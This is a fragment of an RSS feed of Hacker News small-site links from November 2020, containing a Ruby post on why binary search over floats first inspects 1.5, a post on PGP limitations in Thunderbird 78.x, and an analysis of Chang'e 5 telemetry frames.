            <pubDate>Fri, 27 Nov 2020 01:02:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[1.5 is the midpoint between 0 and infinity in Ruby]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25224627">thread link</a>) | @peterzhu2118
<br/>
November 26, 2020 | https://blog.peterzhu.ca/ruby-range-bsearch/ | <a href="https://web.archive.org/web/*/https://blog.peterzhu.ca/ruby-range-bsearch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77
4.8915590244884904e+38
2.7093655358260904e+19
6375342080.0
97792.0
383.0
23.96875
95.8125
47.921875
31.96484375
39.92578125
43.923828125
41.9248046875
42.92431640625
42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>
            </description>
            <link>https://blog.peterzhu.ca/ruby-range-bsearch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25224627</guid>
            <pubDate>Fri, 27 Nov 2020 00:42:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thunderbird 78.x is great but has issues for advanced PGP users]]>
            </title>
            <description>
<![CDATA[
Score 93 | Comments 105 (<a href="https://news.ycombinator.com/item?id=25224515">thread link</a>) | @djsumdog
<br/>
November 26, 2020 | https://www.sindastra.de/p/1583/dear-mozilla-why-thunderbird-78-x-is-both-great-and-awful-pgp/ | <a href="https://web.archive.org/web/*/https://www.sindastra.de/p/1583/dear-mozilla-why-thunderbird-78-x-is-both-great-and-awful-pgp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<a href="#content">Skip to content</a>
<div id="boxed-wrapper">

<div id="wrapper">

<header>


</header>

<main id="main">
<div>
<section id="content">
<article id="post-1583">

<div>
<ul>
<li>
<img width="500" height="492" src="https://www.sindastra.de/wp-content/uploads/2020/11/500px-Thunderbird_Logo_2018.svg.png" alt="Thunderbird Logo" srcset="https://www.sindastra.de/wp-content/uploads/2020/11/500px-Thunderbird_Logo_2018.svg-200x197.png 200w, https://www.sindastra.de/wp-content/uploads/2020/11/500px-Thunderbird_Logo_2018.svg-400x394.png 400w, https://www.sindastra.de/wp-content/uploads/2020/11/500px-Thunderbird_Logo_2018.svg.png 500w" sizes="(max-width: 800px) 100vw, 500px"> </li>
</ul>
</div>
<div>
<p>I am writing this post because Thunderbird 78.x has issues for advanced PGP users. But first, I’d like to say a few words to all the frustrated users: I hear you, I too am displeased with this update, but while it’s easy to complain and rant, we should look at the bright side and still be grateful that Mozilla thought of including PGP, as it makes it more accessible to users that are not as tech-savvy. It’s always good to push for privacy and having it built-in, and easy to use! But, there are issues with the new built-in PGP that we should talk about…</p>
<h2>Preface</h2>
<p>You know, as I stated in <a href="https://www.sindastra.de/p/1566/open-letter-why-it-security-is-obvious-to-me/" target="_blank" rel="noreferrer noopener">my open letter</a>: Security and privacy is important to me. Of course, this means I use PGP, or more specifically, GnuPG with smartcards.</p>
<p>I like FOSS, especially if it’s cross-platform as I use Linux, Mac and Windows (alphabetical order, no preference stated) and it’s great to be able to use your software on all your machines across all systems, and for free! The popular email client, Thunderbird is one such application that meets these criteria, and so is GnuPG (or GPG for short), a popular application that implements the OpenPGP specification.</p>
<p>GnuPG has a ton of features, among those features is the support of smartcards. Keep this in mind.</p>
<p>Now, let’s take a look at the situation in Thunderbird before, and then since version 78.x and what we can do about it.</p>
<h2>The situation <em>before</em> version 78.x</h2>
<p>Before Thunderbird 78.x (namely 68.x), if you had both Thunderbird and GnuPG installed, all you had to do was to install a Thunderbird addon known as Enigmail. This addon basically bridged the gap between Thunderbird and GnuPG, and essentially allowed you to experience full PGP within Thunderbird.</p>
<p>Of course this meant you had to install GnuPG on your system, then an addon, then generate and manage keys, and – although powerful – it was overall not as user-friendly as it could be.</p>
<p>So, even I as an advanced user, was excited that Thunderbird would come with PGP built-in in 78.x as I thought they might ship it with GnuPG, and something like Enigmail but built-in and maybe more user-friendly. At the very least having no third-party things to install sounds better. And convenience is nice, right? But I was wrong.</p>
<h2>The situation <em>since</em> version 78.x</h2>
<p>You see, Mozilla, the people behind Thunderbird did not ship it with GnuPG. Instead, they use a library called RNP. This library does not provide full-featured PGP.</p>
<p>RNP does for example, not support the use of smartcards. Which, basically means no PGP at all for me or any user with smartcards. Thunderbird does currently also not support using subkeys with detached primary key. Which means any advanced user that did a proper, more secure PGP setup, can also not use PGP with Thunderbird for the time being.</p>
<p>So, you might think to yourself: Just install Enigmail! Well, here’s the thing: Enigmail does not work with Thunderbird 78.x!</p>
<p>Thunderbird 78.x has hidden settings in the advanced configuration editor, that you can use to tell it to use external GnuPG, which is great! Except it doesn’t really work…</p>
<p>It did not work for me, and I tried many things, on different systems, followed different guides (including the official Mozilla Wiki), and heard the same from other users through the fediverse. For a friend of mine, setting up Thunderbird to use external GnuPG on Windows made it outright crash whenever trying to open a PGP encrypted email!</p>
<p>And this is basically the problem. On one hand, Mozilla was cool enough to include (some) PGP in Thunderbird which in theory makes it more accessible as you can generate and use keys with a few clicks, which is also good for us advanced users as we can then email privately with friends that would otherwise be unable to use PGP. But on the other hand the execution was bad in such a way that it stabs all the advanced users that were already using (advanced setups of) PGP.</p>
<h2>What to do about it (for now)</h2>
<p>Honestly, my advice to anyone that uses Thunderbird and depends on advanced PGP (smartcard etc.) for now: Just downgrade to Thunderbird 68.x and install Enigmail. It seems it will still receive updates for now and there’s no forced update to 78.x (yet). I just tried, and got an (undocumented) update for the 68.x version (namely 68.12.1).</p>
<p>Let’s hope they will keep providing security updates for 68.x until they have (hopefully) sorted out PGP in version 78.x so that we will eventually be able to upgrade, but without being pushed into a broken environment prematurely.</p>
<p>You can get the latest version of 68.x from here (official download link): <a href="https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/" target="_blank" rel="noreferrer noopener nofollow">https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/</a></p>
<p>Please note that, Thunderbird will notice that the current configuration is from a newer version after downgrading, which you cannot use. This will result in a little window informing you about that on startup. Your only two options are to quit the application, or to create a new (configuration) profile. This means you will have to set up your accounts again but at least PGP will work again (with Enigmail and GnuPG)!</p>
<p>Thank you and goodnight! :D</p>
<h2>UPDATE 2020-NOV-29</h2>
<p>Hey everyone, this article drew many visitors after it was posted on HN (thanks, kind stranger!) and I did read through the comments (both here and some on HN)!</p>
<p>I’d like to address some things:</p>
<ol><li>I saw a tl;dr on HN which mentioned the downgrade recommendation, but without the details. As I understood it, it got criticized as you need to stay up to day for security reasons. And I agree with that. However, I’d like to make it clear that I only recommended a downgrade for now, as it seems the 68.x branch is still getting updates, as I experienced myself. As long as Thunderbird does not drop support for 68.x, and does not force an upgrade to 78.x, I think downgrading is fine. When Thunderbird finally drops support for 68.x, I would of course not recommend staying on outdated software.</li><li>When Thunderbird 68.x reaches EOL, and if 78.x hasn’t sorted out the issues with PGP by then, an alternative, if you’re on Windows and have MS Outlook, would be the free GpgOL extension for Outlook that comes bundled with Gpg4win. Please note that I don’t have experience with this myself, but I’d like to point it out anyway in case it’s useful. There’s also a (paid) Apple Mail extension that comes with gpgtools, however I do not recommend it unless you don’t mind paying for each new major version every year.</li><li>Thank you for informing me that Thunderbird is not part of Mozilla Corporation anymore, but as I understood it, still part of Mozilla Foundation. So, I guess in that case I’m addressing the Mozilla foundation. If this is still wrong, please let me know.</li></ol>
<p>PS I was exhausted and it was late at night when I originally wrote this article, and I wasn’t fully happy with it but people seemed to like it and had very constructive feedback which really helps. Thank you all for stopping by and reading it! &lt;3</p>
</div>
<section>

<div>

<div>
Sindastra is a software developer with 10 years of experience, specialized in backend web development. In her spare time she hacks on things and educates herself on a variety of topics. She likes to play Minecraft with friends and especially enjoys hacking on the game's server code. </div>
</div>
</section>


<p>This site uses Akismet to reduce spam. <a href="https://akismet.com/privacy/" target="_blank" rel="nofollow noopener">Learn how your comment data is processed</a>.</p> </article>
</section>

</div> 
</main> 
 

</div> 
</div> 



<a></a>




</div>]]>
            </description>
            <link>https://www.sindastra.de/p/1583/dear-mozilla-why-thunderbird-78-x-is-both-great-and-awful-pgp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25224515</guid>
            <pubDate>Fri, 27 Nov 2020 00:22:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A look at Chang’e 5 telemetry]]>
            </title>
            <description>
<![CDATA[
Score 154 | Comments 31 (<a href="https://news.ycombinator.com/item?id=25224446">thread link</a>) | @kwk1
<br/>
November 26, 2020 | https://destevez.net/2020/11/a-look-at-change-5-telemetry/ | <a href="https://web.archive.org/web/*/https://destevez.net/2020/11/a-look-at-change-5-telemetry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9213">
		<!-- .entry-header -->

	
	<div>
		
<p><a href="https://en.wikipedia.org/wiki/Chang%27e_5">Chang’e 5</a> is a Chinese lunar sample return mission. It was launched a few days ago on 2020-11-23 from <a href="https://en.wikipedia.org/wiki/Wenchang_Satellite_Launch_Center">Wenchang</a> and <a href="https://twitter.com/coastal8049/status/1331782149490413568">is estimated</a> to perform lunar orbit injection on Saturday. Since then, a number of Amateurs such as <a href="https://twitter.com/usa_satcom/status/1331092113069543425">USA Satcom</a>, <a href="https://twitter.com/uhf_satcom/status/1331317024992210944">Paul Marsh M0EYT</a>, <a href="https://twitter.com/coastal8049/status/1331138035891650560">Scott Tilley VE7TIL</a>, <a href="https://twitter.com/supertrack_it/status/1331354629146365953">Fer IW1DTU</a> and others have been receiving the X-band signals from the spacecraft and posting reports over on Twitter. Meanwhile, <a href="http://r00t.cz/">r00t.cz</a> has been working in <a href="https://twitter.com/r2x0t/status/1331097492482646016">decoding the frames</a>, which has led him to the amazing achievement of being able to <a href="http://www.r00t.cz/Sats/Change5">retrieve a short video</a> from the signal.</p>



<p>In this post I will look at some of the frames demodulated by USA Satcom and Paul during the first couple of days of the mission. The frame structure has many similarities with Tianwen-1, which I have described in several posts, such as <a href="https://destevez.net/2020/08/tianwen-1-telemetry-framing-and-data/" data-type="post" data-id="8773">here</a> and <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/" data-type="post" data-id="8871">here</a>. However, there are some interesting differences.</p>



<h4>Low data rate telemetry</h4>



<p>The low data rate telemetry signal is a PCM/PSK/PM signal with a subcarrier rate of 65536 Hz and a baudrate of 2048 baud. The coding is CCSDS concatenated frames with a Reed-Solomon codeword size of 252 bytes, so that a frame takes 2 seconds to transmit. The Reed-Solomon code uses the dual basis, as specified in the <a href="https://public.ccsds.org/Pubs/131x0b3e1.pdf">TM Synchronization and Channel Coding</a> blue book. This is very similar to Tianwen-1’s low rate signal. The only differences are that Tianwen-1 uses a baudrate of 16384 baud (so frames take 0.25 seconds to transmit), and the conventional Reed-Solomon basis (which is not standard CCSDS).</p>



<p>Chang’e 5 has been seen to use <a href="https://twitter.com/coastal8049/status/1331782140900503556">a number of different frequencies</a> at X-band. Here I will be looking at some frames received by USA Satcom on 2020-11-24 between 4 and 6 UTC.</p>



<p>The frames are CCSDS <a href="https://public.ccsds.org/Pubs/732x0b3e1.pdf">AOS frames</a> coming from spacecraft ID 91. The spacecraft ID is quite relevant, because the spacecraft has different detachable modules: a service module, a return module, a lander, and an ascent module. Most likely each of these modules uses a different spacecraft ID, and we are in fact seeing data from different spacecraft IDs.</p>



<p>Two virtual channels are in use. Virtual channel 1 contains most of the data (a total of 5888 frames), while virtual channel 2 contains only 5 frames.</p>



<p>The AOS frames in both virtual channels have an insert zone that is 8 bytes long. The purpose of the first 4 bytes is unknown, while the last 4 bytes are a little-endian timestamp encoded as the number of seconds elapsed since 2012-08-01 00:00:00 UTC. It is interesting to compare this timestamp format with <a href="https://destevez.net/2020/07/more-about-the-tianwen-1-timestamps/" data-type="post" data-id="8734">that used in Tianwen-1</a>, which uses a 48 bit big-endian timestamp that encodes 100us units since 2016-01-01 00:00:00 Beijing time. The change from big-endian to little-endian is peculiar, since somehow the CCSDS protocols favour big-endian fields, and the change from a Beijing time epoch to a UTC epoch is also an interesting curiosity.</p>



<p>The M_PDU protocol is used to multiplex CCSDS <a href="https://public.ccsds.org/Pubs/133x0b2e1.pdf">Space Packets</a> in the AOS frames.</p>



<p>The figure below shows the timestamps and virtual channel frame counter in the frames from virtual channel 1. The gaps correspond to time gaps between the different files provided by USA Satcom.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>The Space Packets in virtual channel 1 use many different APIDs. I have been browsing through the plots of the data in each of the APIDs and they look reminiscent of Tianwen-1. There are many analogue telemetry channels, but I haven’t been able to spot any that has an obvious meaning, and there doesn’t seem to be any floating point data as in Tianwen-1. Here I show a few of the most interesting APIDs.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid58.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid58-644x654.png" alt="" width="483" height="491" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid58-644x654.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid58-295x300.png 295w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid58-768x780.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid58.png 903w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-644x654.png" alt="" width="483" height="491" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-644x654.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-295x300.png 295w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-768x780.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524.png 903w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png" alt="" width="483" height="487" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-298x300.png 298w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-768x774.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png 910w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<p>The five frames in virtual channel 2 were transmitted consecutively, perhaps in response to a telecommand. Each of them contains a single Space Packet from APID 897 that occupies all the frame.</p>



<p>The data from these Space Packets looks like some kind of file download or memory dump. The first 8 bytes contain three fixed bytes that maybe identify the file or the region of memory followed by a 5 byte little-endian chunk counter. The transfer here uses only 5 chunks, and most of the data in the last chunk is filled with <code>0xaa</code> padding bytes. The figure below shows the data in this transfer, with one chunk per row. The data clearly shows patterns, but I have no idea what it is.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png"><img loading="lazy" width="644" height="187" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-300x87.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-768x223.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png 864w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Chang’e transfer in APID 897</figcaption></figure>



<p>The code and data used in this part of the post, including the full plots of all the APIDs, can be found in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/CE5/CE-5%20frame%20analysis.ipynb">this Jupyter notebook</a>.</p>



<h4>High data rate telemetry</h4>



<p>The high data rate telemetry uses 2.5Mbaud BPSK <a href="https://twitter.com/r2x0t/status/1331351055972642818">according to r00t</a>. Coding is, as in the case of <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/">Tianwen-1 high data rate long frames</a>, concatenated CCSDS frames using four interleaved Reed-Solomon codewords (with 255 bytes each).</p>



<p>The data used here is a short segment received by Paul on 2020-11-24 between 20:52 and 20:58 UTC at 8455 MHz. It is quite interesting to see the errors corrected by the Reed-Solomon decoder, which show large variability but indicate that Paul has more than enough SNR margin to decode the signal.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png"><img loading="lazy" width="612" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png 612w, https://destevez.net/wp-content/uploads/2020/11/ce5_rs-300x190.png 300w" sizes="(max-width: 612px) 100vw, 612px"></a></figure>



<p>The data consists of AOS frames from spacecraft ID 26 (note this is a different spacecraft ID to the one in the low rate data used in the previous part). Virtual channels 38 and 63 are in use, with 18396 and 51850 frames respectively.</p>



<p>In contrast to the AOS frames used for the low data rate telemetry, here the AOS insert zone is only 6 bytes long, with 2 unknown bytes that always contain the value <code>0xf0f0</code> followed by a 4 byte timestamp using the same format as in the low data rate frames. There is no M_PDU. The data follows directly after the insert zone.</p>



<p>Virtual channel 63 consists solely of idle data. This is a standard feature of the AOS Space Data Link protocol called OID channel (only idle data), which is always virtual channel 63. The data in the frames of this virtual channel is filled with <code>0xaa</code> padding.</p>



<p>The figure below shows the timestamps and frame counter in the OID channel.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The frame loss computed from the jumps in the virtual channel frame counter shows that very few frames were lost. The large jumps near the end correspond to a gap in Paul’s data, which is divided into two files.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>Virtual channel 38 is quite interesting. I <a href="https://twitter.com/ea4gpz/status/1331711668045434886">joked on Twitter</a> that it resembles the Inception film, because it has several layers of CCSDS protocols. The timestamps in this virtual channel are quite weird, since comparing with the timestamps from the OID channel they seem to run too fast and extend into the future. There is no way that the 18396 frames in this virtual channel are able to span one hour and 30 minutes as shown here. I’m not sure what’s happening with this.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>This shows the first frames in virtual channel 38. We can discern the AOS headers, then two parts that seem quite similar, and then a large section of <code>0xaa</code> padding.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png"><img loading="lazy" width="644" height="173" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-300x80.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-768x206.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png 877w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The data field of each of these AOS frames contains a single Space Packet, which is embedded directly without using M_PDU. The length of the Space Packet is 510 bytes including its header, which explains why the end of the AOS frame is filled with padding. These Space Packets belong to APID 92.</p>



<p>The contents of each of these Space Packets are two back to back AOS frames, which explains the repetition in the figure below. The AOS frames belong to spacecraft ID 197 (yet a new spacecraft!), virtual channel ID 52, and have the replay flag set.</p>



<p>The insert zone of these replayed AOS frames contains three unknown bytes followed by a 32 bit timestamp in the usual format. The timestamps and frame counts are shown below. The replay data is actually from the previous day, starting just 30 minutes after launch.</p>



<figure><img loading="lazy" width="631" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png 631w, https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc-300x184.png 300w" sizes="(max-width: 631px) 100vw, 631px"></figure>



<p>These AOS frames have a CRC-16, in contrast with the usual AOS frames, which rely on the Reed-Solomon parity check bytes for error detection. The CRC of all the replay frames I’ve decoded is correct.</p>



<p>These replay AOS frames use M_PDU, and contain Space Packets from APIDs 301 and 2047 (the idle APID). As expected, the idle APID packets contain only zeros. The data in APID 301 is shown in the figure below. I am not sure how to interpret it, but some of the structure is evident.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png" alt="" width="644" height="640" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-300x298.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-768x763.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png 923w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The data and code used in this part of the post can be found in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/CE5/CE-5%20high-speed%20frame.ipynb">this Jupyter notebook</a>.</p>



<p>Thanks to all the Amateur community for keeping these kind of activities going with fresh interest after each lunch and best of luck to the Chinese Lunar Exploration Program with their very interesting and challenging mission.</p>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://destevez.net/2020/11/a-look-at-change-5-telemetry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25224446</guid>
            <pubDate>Fri, 27 Nov 2020 00:06:00 GMT</pubDate>
        </item>
    </channel>
</rss>
